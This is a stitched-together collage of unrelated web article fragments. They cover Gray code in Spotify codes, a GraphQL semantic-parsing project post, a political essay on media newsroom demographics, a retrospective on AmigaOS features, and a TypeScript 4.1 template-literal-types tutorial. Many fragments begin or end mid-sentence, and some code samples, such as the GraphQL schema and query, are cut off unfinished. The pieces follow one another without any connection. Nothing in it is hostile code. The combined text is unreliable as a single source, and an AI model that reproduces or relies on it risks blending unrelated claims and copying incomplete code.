time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

<p>The OpenAI scholars program requires a final open source project. I've been eagerly working on it and I'm happy to present it now. Along with this blog post, my final presentation, code and an academic paper, I present &nbsp;<strong>Semantic Parsing English-to-GraphQL </strong>(SPEGQL). </p><p>I presented this project in my final project proposal. So in this post, I'll cover some of the highlights. The full details can be found in <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">this paper</a>. &nbsp;</p><h3 id="background">Background</h3><p><strong>GraphQL</strong></p><p><a href="https://graphql.org/">GraphQL</a> is a query language for your api.</p><p>It's become very popular recently because of several reasons. It represents the schema as a graph, nested relations of any depth can be easily queried, it can aggregate data over multiple datasources and responses are predictable among other things.</p><p><strong>Semantic Parsing</strong></p><p>Semantic parsing is the task of converting a natural language utterance to a logical form: a machine-understandable representation of its meaning. In this case I wanted to semantically parse English to GraphQL.<br></p><p>Why this project?</p><p>I had a few reasons to work on this project:</p><ul><li>I wanted to understand the limits of general language models for Semantic Parsing</li><li>This project could potentially ease the learning curve for new developers of GraphQL </li><li>Potential tooling for non technical data users such as managers to gain insights into their data</li></ul><h2 id="objective">Objective</h2><p>Given an English prompt:</p><blockquote><em>“What is the name and date of the song released most recently?”</em></blockquote><p>And some GraphQL Schema</p><pre><code>type song {

<p>Find a corresponding GraphQL Query: </p><pre><code>query {

<p>This objective could be tested by passing the prompt and schema though a model to output a query.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to Thursday! </p><p>I’ve been reading some interesting policy reports about everything from <a href="https://t.co/CxLqshzCAg">maternal mortality</a> to <a href="https://www.urban.org/urban-wire/can-we-design-student-loan-forgiveness-target-low-income-families">how to target student loan forgiveness</a> but at the moment there is a lot of demand for me to address the situation at Vox in detail or to assimilate my personal story into a larger narrative about “wokeness” or the culture wars. Personally I’m not a huge fan of navel-gazing. So I’ll just say that my personal interest in reclaiming my status as an independent, blog-like voice transcends any particular issues with any particular publication. I wanted to do <em>this,</em> not go find a different job, and I thank those of you who’ve joined me on this journey.</p><p>But Vox is typical of a few trends that exist broadly in the media industry and that I do think are of interest. </p><ul><li><p>The staff skews very young. </p></li><li><p>The staff is concentrated in big coastal cities, and especially New York.</p></li><li><p>The staff is overwhelmingly composed of graduates of selective colleges (state university flagship campuses and private schools with names you know).</p></li></ul><p>The media industry has long skewed young, educated, and New Yorky. But digital disruption trends have made it more so than ever before. Daily newspapers published in mid-sized cities and small towns are weaker and less significant. A lot of reporters born in the 1960s and 1970s have left the industry as it has shrunk and few of them work at digital native startups. </p><p>Separately from that change, national politics has been polarizing around age, educational attainment and population density in an unprecedented way. A group of young, recent college graduates living in Brooklyn would’ve skewed left in 1990 but this was an era when Al D’Amato could win statewide in New York and Democratic presidential campaigns would win in West Virginia. Today a demographically identical group skews much further left than it used to. None of this is really an outcome that anyone particularly wanted or intended.

The employees responsible for distributing the Times in the past — typesetters, pressmen, delivery drivers — had never been encouraged to speak up about the ethical questions at the heart of the paper’s journalism. But the app developers and software engineers who deliver the Times’ journalism to the world have held their hands up in just as many Ivy League seminars as their editorial peers. They might be too shy to march over to a masthead editor and complain about a clumsy headline, but #newsroom-feedback had opened a digital door to criticism. Reporters found that suddenly it was the Times’ programmers and developers, rather than their editors, who were critiquing their work. During the town hall about the Cotton op-ed, one data engineer said on Slack, “How many such process failures would be tolerated in tech?”</p><p>Many of the techsurrectionists had come from Facebook or Uber or Amazon to join the Times out of a sense of mission, leaving the ethical quandaries of the tech industry for what they thought were more virtuous pastures. “I joined the company for one reason, and it’s because I feel a responsibility to be a part of a mission that I believe in,” a product manager who previously worked at Apple wrote in #newsroom-feedback after the Cotton op-ed. “This feels like the rug’s been pulled out from under us — not just because it feels like that mission [has] been severely compromised by the decision to publish this piece, but even more so because the products we’re building were used to do it.”</p><p>“It’s like making telephone poles,” one software engineer added, “and finding out they’re being used as battering rams.”</p></blockquote><p>People who cover politics professionally, for better or worse, end up spending a fair amount of time talking to Republicans and trying to understand what conservatives think about public policy issues. If we’re doing our jobs at all correctly we can do stories that bring a mostly-progressive audience a greater understanding of what is happening on the other side. And when a professional political reporter does a bad job it’s often because he or she is taking a dive to maintain relationships with sources on the right, or bending over <em>too far</em> backwards to be fair. </p><p>At the same time, we political journalists have our fair share of totally ignorant hot takes about music or cooking or sports or whatever else that we can fire off. </p><p>The flip side is that our colleagues who cover sports or music or cooking also have hot takes about politics. Hot takes that come from the very narrow demographic and ideological niche that dominates the media and is untempered by the need to actually cover politics.</p><h4>Coverage has gotten really weird </h4><p>Ian Walker <a href="https://kotaku.com/playstation-5-the-kotaku-review-1845588904">recently ended his PS5 review for Kotaku with this thought</a>: </p><blockquote><p>The world is still reeling under the weight of the covid-19 pandemic. There are more Americans out of work right now than at any point in the country’s history, with no relief in sight. Our health care system is an inherently evil institution that forces people to ration life-saving medications like insulin and choose suicide over suffering with untreated mental illness.</p><p>As I’m writing this, it looks very likely that Joe Biden will be our next president. But it’s clear that the worst people aren’t going away just because a new old white man is sitting behind the Resolute desk—well, at least not&nbsp;<em>this</em>&nbsp;old white man. Our government is fundamentally broken in a way that necessitates radical change rather than incremental electorialism.</p><p>The harsh truth is that, for the reasons listed above and more, a lot of people simply won’t be able to buy a PlayStation 5, regardless of supply. Or if they can, concerns over increasing austerity in the United States and the growing threat of widespread political violence supersede any enthusiasm about the console’s SSD or how ray tracing makes reflections more realistic. That’s not to say you&nbsp;<em>can’t</em>&nbsp;be excited for those things—I certainly am, on some level—but there’s an irrefutable level of privilege attached to the ability to simply tune out the world as it burns around you.</p></blockquote><p>The problem here, to me, is not that Walker ought to “stick to sports.” It’s that the analysis is bad. But because it’s in a video game console review rather than a policy analysis section and conforms to the predominant ideological fads, it just sails through to our screens. </p><p>What actually happened is that starting in March the household savings rate soared (people are taking fewer vacations and eating out less) and while it’s been declining from its peak as of September it was still unusually high.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png&quot;,&quot;height&quot;:700,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:94064,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>One result of this is a lot of people have been able to pay off old debts.

But I don’t really think the underlying dynamics are specific to any particular issue area. </p><p>I remember a time in December 2018 when there was a <a href="https://www.vox.com/the-goods/2018/11/26/18112769/amazon-prime-cancel">flurry of articles about an Amazon Prime backlash</a> and I felt inspired to write a corrective noting that <a href="https://www.vox.com/policy-and-politics/2018/12/11/18129809/amazon-polling-popular-confidence">Amazon is actually incredibly popular</a> both as a shopping destination and in polls. In response to a similar barrage of articles about how <a href="https://www.vanityfair.com/style/2020/04/how-should-a-climate-change-reporter-think-about-having-children">maybe you shouldn’t have children because of climate change</a>, I felt inspired to write, at somewhat greater length, my book One Billion Americans. </p><p>The basic dynamic is that if you take a normal distribution (say of political views) and then shift the average a bit to one side, you end up with explosive growth in the number of outliers. In this chart, the average of the red line isn’t so different from the average of the black line. But the right-hand tail of the red line is much higher than the black.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg&quot;,&quot;height&quot;:461,&quot;width&quot;:999,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:85183,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If everyone in digital media is an under-fifty college graduate living in a big city, then it’s not that everyone in digital media is a far-left weirdo, but you do get <em>drastically more</em> far-left weirdness. </p><p>This tendency could obviously be tempered by business considerations.

<h3 id="intro">Introduction</h3>

<p>
To most people, the Amiga is probably synonymous with the Amiga 500 and that 
machine was, above all, a video game: something into which you plonked 
3.5" floppy disks that transported you to strange, wonderful worlds and 
hours of fun. To this group, the gamers, the operating system wasn't 
important. They probably booted Workbench 1.3 
only once, took a good look at the garish blue and orange interface,
and decided that enough was enough, before going back to blasting enemies 
in Silkworm.
</p>

<p>
And why not? The machine was great for games. There are tons of great 
texts about the groundbreaking audio and video capabilities of the 
Amiga.
</p>

<p>
This text is not one of those.
</p>

<p>
This text is about the later versions of AmigaOS produced by Commodore, 
from 2.0 to 3.1. While these newer versions (with majors released in 1990 
and 1992, respectively) certainly carried the Amiga heritage with pride 
and were - mostly - backwards compatible, the advent of AmigaOS 2.0 
marked a paradigm shift. The shift is best symbolized by the fact that 
AmigaBASIC - the ubiquitous and mandatory language of any 
self-respecting eighties home computer - was ditched and replaced by 
ARexx, a professional scripting language without any kind of graphics or 
sound features whatsoever.
</p>

<p>
This paradigm shift is also why so many of us who had the good fortune 
to come across those versions clung to the Amiga so desperately. A lot
of us stuck with it
well into the late nineties, years after Commodore's demise. And we were
fierce: if 
you think Apple fanboys are annoying today, be very happy you didn't meet an 
Amiga zealot in 1995. Things got personal quickly. It was downright ugly.
</p>

<p>
I still think there were some grounds for our fanaticism, though.
</p>

<p>
In a time when home PC:s were single tasking DOS boxes with 8 character 
file names and Ataris and Macs were single tasking GUI boxes, hampering
any hacker  with their glaring lack of a CLI, the Amiga was a champion of both 
worlds: It combined the CLI and GUI, leveraging both their strengths.
But there was more to it than that, something that's hard to convey
in so many words.
</p>

<p>
Many a time have I come across exasperated Amiga users who, on some 
online forum, tries to explain the greatness of the Amiga's operating 
system in a few short sentences. It often, quite understandably, boils 
down to something akin to "It's like UNIX", which I always think is 
unfair to both of the systems.
</p>

<p>
Sure, it was an early multitasking system with a capable command line. 
At the same time, it was also a mature and coherent desktop environment 
with levels of user friendliness much more like today's MacOS X than any 
traditional UNIX. But, contrary to today's MacOS, it never mollycoddled the
end user. It opened the machine up, rather than closing certain parts off.
</p>

<p>
Unlike UNIX, AmigaOS is a system designed for home computer use, lacking a 
lot of what makes UNIX so popular: memory protection, multi user 
support, source code portability and built in networking support.
</p>

<p>
They're very much alike in one aspect, though. Like UNIX, the Amiga's 
operating system is a collection of a lot of little strokes of genius 
that come together to make it bigger than the sum of its parts.
</p>

<p>
I invite you to explore this ingenuity with me. But first, let's get the 
terminology sorted.
</p>

<h3 id="jargon">Jargon buster</h3>

<p>
The Amiga's operating system has been called a lot of things by a lot of 
people, because it consists of many components that different types of 
users interacted more or less with. Let me try to clear things up a bit:
</p>


<dl>
<dt>AmigaOS</dt>

<dd>
This was never an official name during the Commodore days, but it's a 
handy way of describing all of the components below as a whole.
</dd>

<dt>Kickstart</dt>

<dd>
This is basically the firmware of the Amiga, residing in the ROM chip. 
On version 2.0 and up, the ROM chip was 512 kB large and contained not 
only code for self tests and bootstrapping but also quite sizable 
portions of the other parts of AmigaOS.
</dd>

<dt>AmigaDOS</dt>

<dd>
This is, roughly speaking, the command line interface, device drivers, 
file system management and so on. It was originally based on TRIPOS, a 
heritage that still shows to this day. (There are newer versions of AmigaOS
than 3.1, but this text will only cover the ones released by Commodore.)
</dd>

<dt>Intuition</dt>

<dd>
Best likened to a modern desktop compositor, Intuition handles screen 
updates and manages windows. The custom sound and video chips in the 
Amiga had mostly female names (Paula, Denise and later Alice), so I 
suppose Intuition is a fitting name for an abstraction layer that lets 
the OS interface with them.
</dd>

<dt>Workbench</dt>

<dd>
This is often used interchangeably with "AmigaOS" but it's really the 
name of just the desktop environment - which is a workbench, not a 
desktop: Programs are called tools, folders a called drawers and data 
files are called projects.
</dd>

</dl>

<h4>Other terminology</h4>

<dl>

<dt>Requesters</dt>

<dd>
Not really a major part of the OS per se, a requester is the Amiga's 
name for a dialog box. A "file requester" is a file selection dialog, 
for example. I still often use this term to describe any dialog on any 
platform, much to the confusion of friends and colleagues. Old habits 
die hard.
</dd>

<dt>Devices</dt>

<dd>
Devices, much like in UNIX, usually represent peripherals attached to the 
computer, such as storage media, printers, etc. The Amiga has a number 
of built-in devices that are automatically mounted,
for example the internal floppy drive, <code>DF0:</code>
and  the serial and parallel ports, <code>SER:</code> and <code>PAR:</code>
respectively. Other 
common devices are <code>DF1:</code>, the first external floppy drive,
<code>DH0:</code>, the 
common device name given to the bootable hard drive partition, and 
<code>CON:</code>, the text console.
There are also devices that can't
be mounted but only
be accessed using programming languages, such as <code>timer.device</code>
which is used to interface with hardware clocks.
</dd>

<dt>Volumes</dt>

<dd>
Mounted devices (such as <code>DF0</code>, <code>DF1</code>, <code>DH0</code>)
can contain a volume. In the 
case of <code>DH0:</code>, a bootable hard drive partition,
the volume is fixed and 
is represented by the name of the partition, such as <code>System:</code> or 
<code>Boot:</code>.
If you insert the Deluxe Paint program disk into the internal 
floppy drive, the current volume in device <code>DF0:</code>
will be <code>DPaint:</code>.
</dd>

</dl>

applications, placed on the desktop for easy access.

</p>

<h3 id="ramdisk">The RAM Disk</h3>

<p>
The Amiga always has a RAM disk ready for use and the device name is 
always <code>RAM:</code>. No mounting, no third party software - it just sits 
there, waiting. That's clever in its own right, but the really ingenious 
part about it is that it's dynamically allocated. That means the size of the 
RAM disk corresponds to the amount of free memory currently available on 
the system, and that it never takes up more memory than is needed to
accommodate the files currently stored on it.
</p>

<p>
A RAM disk might sound esoteric today, but in the days of slow 
mechanical hard drives and floppy disks, it was a godsend for unpacking 
archives, running test compiles and storing temporary working documents.
</p>

<p>
The downside is that every time you reboot your computer, all the 
contents of the RAM disk are lost. Which brings us to...
</p>

<h3 id="raddisk">The RAD Disk</h3>

<p>
RAD, which (somehow) stands for Recoverable Ram Disk, is another 
testament to the flexibility and ingenuity of AmigaOS. The RAD disk is a 
fixed size RAM disk that can not only survive reboots but also itself
be booted from. It can be used as a small but extremely fast mini hard
drive, or  for extracting disk images to, for checking out their contents.
</p>

<h3 id="propscroll">Proportional scroll bars</h3>

<p>
A proportional scroll bar is a scroll bar that grows and shrinks to 
reflect the size of the scrollable content it represents:
</p>

<p>
<a href="https://datagubbe.se/ltmag/gfxs/propscroll.png">

</p>
<p>

</p>

<p>
Highlighting a feature like this might 
seem like a silly point to make, because today all scroll bars are 
proportional. Not so in the bad old days: Microsoft 
didn't implement them until Windows 95 and Apple, as far as I know,
didn't make the move until MacOS 9 in 1999. In a time when computer mice 
had no scroll wheels, this was a nifty feature indeed.
</p>

<h3 id="editors">The Text Editors</h3>

<p>
<a href="https://datagubbe.se/ltmag/gfxs/ed.png">
<img src="https://datagubbe.se/ltmag/gfxs/ed.png" alt="Screenshot of Ed in full screen mode.">

<p>
<i>
Above, Ed is used to edit S:Shell-Startup, the equivalent of .bashrc for
AmigaShell. The editor is currently in command mode, getting ready to delete
a line of text.

</p>

<p>
AmigaOS shipped with three different text editors: Ed, Edit and MEmacs. 
The latter is a port of, you guessed it, Micro Emacs, and will of course 
appeal to Emacs fans. The other two are sort of curiously named: Edit is 
a line editor mostly resembling ed on UNIX. The Amiga's Ed, on the other 
hand, is a full screen editor with both mouse support and an 
extensive command language. Amiga Ed is probably best likened with vi.
</p>

<p>
All three of them are capable and powerful editors. Both MEmacs and Ed 
make use of the Amiga's drop down GUI menus and feature support for 
macros and extensive configuration.
</p>

<p>
Ed's command mode is, as mentioned earlier, somewhat reminiscent of vi. 
Consider the following examples:
</p>

  <div itemprop="articleBody">
    <p><a href="https://devblogs.microsoft.com/typescript/announcing-typescript-4-1/">TypeScript 4.1 has just been released.</a> This edition of the language builds on the features <a href="https://devblogs.microsoft.com/typescript/announcing-typescript-4-0/">introduced in version 4.0</a> with a group of new tools which provide typesafe ways to express common dynamic JavaScript patterns. As with most powerful type system features, they can also be used and abused in weird and wonderful ways.</p>

<p>One of the most interesting new features is <strong>template literal types</strong>. Back in ES2015, a new string syntax called a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">template literal</a> was added to JavaScript, providing a convenient and readable way to insert values into strings. These are strings delimited by backticks which evaluate any expression surrounded by <code>${</code> … <code>}</code>, inserting the result into the string.</p>

<div><div><pre><code><span>const</span> <span>name</span> <span>=</span> <span>"</span><span>Anders</span><span>"</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>`Hello, </span><span>${</span><span>name</span><span>}</span><span>!`</span><span>);</span> <span>// prints "Hello, Anders!"</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>`I said, HELLO </span><span>${</span><span>name</span><span>.</span><span>toUpperCase</span><span>()}</span><span>!`</span><span>);</span> <span>// print "I said, HELLO ANDERS!"</span>
</code></pre></div></div>

<p>In TypeScript 4.1, you can now use the template literal syntax in <em>types</em> as well as <em>values</em>. This means if you have a type which represents a single string literal or, more likely, a union of multiple string literals, you can use a template literal type to create a new string literal type derived from the old one.</p>

<div><div><pre><code><span>type</span> <span>Animal</span> <span>=</span> <span>"</span><span>shark</span><span>"</span> <span>|</span> <span>"</span><span>giraffe</span><span>"</span> <span>|</span> <span>"</span><span>platypus</span><span>"</span><span>;</span>
<span>type</span> <span>BabyAnimal</span> <span>=</span> <span>`baby-</span><span>${</span><span>Animal</span><span>}</span><span>`</span><span>;</span> <span>// = "baby-shark" | "baby-giraffe" | "baby-platypus"</span>
</code></pre></div></div>

<p>As the example above shows, the transformation is distributed over the union, being applied to each member separately, then producing a union of the results. If you include multiple union types in the template literal, it produces every combination.</p>

<div><div><pre><code><span>type</span> <span>Animal</span> <span>=</span> <span>"</span><span>shark</span><span>"</span> <span>|</span> <span>"</span><span>giraffe</span><span>"</span> <span>|</span> <span>"</span><span>platypus</span><span>"</span><span>;</span>
<span>type</span> <span>Age</span> <span>=</span> <span>"</span><span>baby</span><span>"</span> <span>|</span> <span>"</span><span>adolescent</span><span>"</span> <span>|</span> <span>"</span><span>old</span><span>"</span><span>;</span>
<span>type</span> <span>BabyAnimal</span> <span>=</span> <span>`</span><span>${</span><span>Age</span><span>}</span><span>-</span><span>${</span><span>Animal</span><span>}</span><span>`</span><span>;</span>
<span>// = "baby-shark" |</span>
<span>//   "baby-giraffe" |</span>
<span>//   "baby-platypus" |</span>
<span>//   "adolescent-shark" |</span>
<span>//   "adolescent-giraffe" |</span>
<span>//   "adolescent-platypus" |</span>
<span>//   "old-shark" |</span>
<span>//   "old-giraffe" |</span>
<span>//   "old-platypus"</span>
</code></pre></div></div>

<p>As well as building up new string literal types from shorter pieces, we can also extract parts of the string by matching a pattern. To do this we need to combine template literal types with <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html#type-inference-in-conditional-types">conditional types and the <code>infer</code> keyword</a>.</p>

<div><div><pre><code><span>type</span> <span>ExtractVerb</span><span>&lt;</span><span>S</span> <span>extends</span> <span>string</span><span>&gt;</span> <span>=</span>
    <span>S</span> <span>extends</span> <span>`</span><span>${</span><span>infer</span> <span>Verb</span><span>}</span><span> </span><span>${</span><span>infer</span> <span>Activity</span><span>}</span><span>`</span> <span>?</span> <span>Verb</span> <span>:</span> <span>never</span><span>;</span>

<span>type</span> <span>Verbs</span> <span>=</span> <span>ExtractVerb</span><span>&lt;</span><span>"</span><span>play chess</span><span>"</span> <span>|</span> <span>"</span><span>write code</span><span>"</span> <span>|</span> <span>"</span><span>read hacker news</span><span>"</span><span>&gt;</span>
<span>// = "play" | "write" | "read"</span>
</code></pre></div></div>

<p>This means we can break down a string into its substrings and return different types based on the contents of those substrings. That is everything we need to implement a simple parser. Let’s look at some potential applications.</p>

<h2 id="routing">Routing</h2>

<p>In Node.js web frameworks like <a href="https://expressjs.com/">Express</a>, it is common to define URL routing rules by using a path pattern given as a string. These strings can contain placeholders to represent dynamic parts of the path like IDs and slugs. Express uses a colon prefix for these path parameters. You can then access the values of these parameters in the route handler function using the object <code>req.params</code>.</p>

<div><div><pre><code><span>app</span><span>.</span><span>get</span><span>(</span><span>"</span><span>/users/:userId/posts/:postId</span><span>"</span><span>,</span> <span>(</span><span>req</span><span>,</span> <span>res</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>userId</span> <span>=</span> <span>req</span><span>.</span><span>params</span><span>.</span><span>userId</span><span>;</span>
    <span>const</span> <span>postId</span> <span>=</span> <span>req</span><span>.</span><span>params</span><span>.</span><span>posId</span><span>;</span>
    <span>res</span><span>.</span><span>send</span><span>(</span><span>`Requested post </span><span>${</span><span>postId</span><span>}</span><span> from user </span><span>${</span><span>userId</span><span>}</span><span>`</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>The code above will be perfectly acceptable to the TypeScript compiler, but if you run it, you’ll notice the server responds with something like this:</p>

<blockquote>
  <p>Requested post undefined from user 12</p>
</blockquote>

<p>There is a typo in the function, but TypeScript did not complain. That is because the type of <code>req.params</code> is a <code>ParamsDictionary</code>.</p>

<div><div><pre><code><span>interface</span> <span>ParamsDictionary</span> <span>{</span>
    <span>[</span><span>key</span><span>:</span> <span>string</span><span>]:</span> <span>string</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This type just says it is an object with string keys and string values. It knows nothing about which keys the object will actually have at runtime, so it isn’t much better than <code>any</code>. Template literal types allow us to parse the path to produce a safe and accurate type for <code>req.params</code>.</p>

<p>First, we need a generic type which can parse our path string literal to extract the parameters preceded by a colon. At the type level, we don’t have normal data structures like arrays, so we will need to represent the parameters as a union.</p>

<div><div><pre><code><span>type</span> <span>PathParams</span><span>&lt;</span><span>Path</span> <span>extends</span> <span>string</span><span>&gt;</span> <span>=</span>
    <span>Path</span> <span>extends</span> <span>`:</span><span>${</span><span>infer</span> <span>Param</span><span>}</span><span>/</span><span>${</span><span>infer</span> <span>Rest</span><span>}</span><span>`</span> <span>?</span> <span>Param</span> <span>|</span> <span>PathParams</span><span>&lt;</span><span>Rest</span><span>&gt;</span> <span>:</span>
    <span>Path</span> <span>extends</span> <span>`:</span><span>${</span><span>infer</span> <span>Param</span><span>}</span><span>`</span> <span>?</span> <span>Param</span> <span>:</span>
    <span>Path</span> <span>extends</span> <span>`</span><span>${</span><span>infer</span> <span>_Prefix</span><span>}</span><span>:</span><span>${</span><span>infer</span> <span>Rest</span><span>}</span><span>`</span> <span>?</span> <span>PathParams</span><span>&lt;</span><span>`:</span><span>${</span><span>Rest</span><span>}</span><span>`</span><span>&gt;</span> <span>:</span>
    <span>never</span><span>;</span>
</code></pre></div></div>

<p>It may look a little scary, but once you break it down, it’s not too bad.</p>

<ul>
  <li>The first case matches parameters at the start or middle of the path.<br>
e.g. <code>":userId/posts/:postId"</code>.</li>
  <li>The second case matches parameters at the end of the path.<br>
e.g. <code>":postId"</code>.</li>
  <li>The third matches strings with some other content before a parameter and strips it away.<br>
e.g. <code>"/posts/:postId"</code>.</li>
  <li>In the fourth and final case where none of the three patterns match, we return the <code>never</code> type, because this behaves like an empty set when used like a union.</li>
</ul>

<p>In the first and third cases it recursively calls itself with a shorter section of the string.</p>

<p>Applying this type to the path from above gives the parameter names, as we expect.</p>

<div><div><pre><code><span>type</span> <span>ParamNames</span> <span>=</span> <span>PathParams</span><span>&lt;</span><span>"</span><span>/users/:userId/posts/:postId</span><span>"</span><span>&gt;</span><span>;</span>
<span>// = "userId" | "postId"</span>
</code></pre></div></div>

<p>We can use a mapped type to generate an object with those parameter names as keys.</p>

<div><div><pre><code><span>type</span> <span>PathArgs</span><span>&lt;</span><span>Path</span> <span>extends</span> <span>string</span><span>&gt;</span> <span>=</span> <span>{</span>
    <span>[</span><span>K</span> <span>in</span> <span>PathParams</span><span>&lt;</span><span>Path</span><span>&gt;</span><span>]:</span> <span>string</span>
<span>};</span>

<span>type</span> <span>Params</span> <span>=</span> <span>PathArgs</span><span>&lt;</span><span>"</span><span>/users/:userId/posts/:postId</span><span>"</span><span>&gt;</span><span>;</span>
<span>// = { userId: string, postId: string }</span>
</code></pre></div></div>

<p>Great! That’s the type we want for <code>req.params</code>.</p>

<p>Now all that is left to do is to use this type in the routing method of our web framework.</p>

<div><div><pre><code><span>const</span> <span>app</span> <span>=</span> <span>{</span>
    <span>get</span><span>&lt;</span><span>P</span> <span>extends</span> <span>string</span><span>&gt;</span><span>(</span>
        <span>path</span><span>:</span> <span>P</span><span>,</span>
        <span>handler</span><span>:</span> <span>(</span><span>req</span><span>:</span> <span>{</span> <span>params</span><span>:</span> <span>PathArgs</span><span>&lt;</span><span>P</span><span>&gt;</span> <span>},</span> <span>res</span><span>:</span> <span>any</span><span>)</span> <span>=&gt;</span> <span>void</span><span>,</span>
    <span>):</span> <span>void</span> <span>{</span>
        <span>// web framework goes here...</span>
    <span>}</span>
    <span>// other methods...</span>
<span>};</span>
</code></pre></div></div>

<p><em><strong>NOTE:</strong> In a real implementation, <code>req</code> would have many other properties and <code>res</code> would be strongly typed. I have omitted those details to simplify this example.</em></p>

<p>Now, the compiler catches the typo in our route handler. It even provides a suggestion to fix it!</p>

<div><div><pre><code><span>app</span><span>.</span><span>get</span><span>(</span><span>"</span><span>/users/:userId/posts/:postId</span><span>"</span><span>,</span> <span>(</span><span>req</span><span>,</span> <span>res</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>userId</span> <span>=</span> <span>req</span><span>.</span><span>params</span><span>.</span><span>userId</span><span>;</span>
    <span>const</span> <span>postId</span> <span>=</span> <span>req</span><span>.</span><span>params</span><span>.</span><span>postld</span><span>;</span>
    <span>res</span><span>.</span><span>send</span><span>(</span><span>`Requested post </span><span>${</span><span>postId</span><span>}</span><span> from user </span><span>${</span><span>userId</span><span>}</span><span>`</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<blockquote>
  <p><code>Property 'postld' does not exist on type 'PathArgs&lt;"/users/:userId/posts/:postId"&gt;'. Did you mean 'postId'?</code></p>
</blockquote>

<h2 id="dispatching-actions">Dispatching Actions</h2>

<p>It’s a common pattern in many applications to represent actions in the system as values. This lets you easily track history, pass the actions over a network, and make code easier to test. The types to represent our actions might look something like this.</p>

<div><div><pre><code><span>type</span> <span>BakeBrownies</span> <span>=</span> <span>{</span> <span>tag</span><span>:</span> <span>"</span><span>BAKE_BROWNIES</span><span>"</span><span>,</span> <span>quantity</span><span>:</span> <span>number</span> <span>};</span>
<span>type</span> <span>EatBrownie</span> <span>=</span> <span>{</span> <span>tag</span><span>:</span> <span>"</span><span>EAT_BROWNIE</span><span>"</span> <span>};</span>
<span>type</span> <span>Action</span> <span>=</span> <span>BakeBrownies</span> <span>|</span> <span>EatBrownie</span><span>;</span>
</code></pre></div></div>

<p>Eventually we need to do something with these action objects, so let’s write a simple class to handle them.</p>

<div><div><pre><code><span>class</span> <span>BrownieCounter</span> <span>{</span>
    <span>brownieCount</span> <span>=</span> <span>0</span><span>;</span>

    <span>bakeBrownies</span><span>(</span><span>action</span><span>:</span> <span>BakeBrownies</span><span>):</span> <span>void</span> <span>{</span>
        <span>this</span><span>.</span><span>brownieCount</span> <span>+=</span> <span>action</span><span>.</span><span>quantity</span><span>;</span>
    <span>}</span>

    <span>eatBrownie</span><span>(</span><span>action</span><span>:</span> <span>EatBrownie</span><span>):</span> <span>void</span> <span>{</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span><span>brownieCount</span> <span>&gt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>"</span><span>Om nom nom</span><span>"</span><span>);</span>
            <span>this</span><span>.</span><span>brownieCount</span> <span>-=</span> <span>1</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>"</span><span>Noooooo!</span><span>"</span><span>);</span>
        <span>}</span>
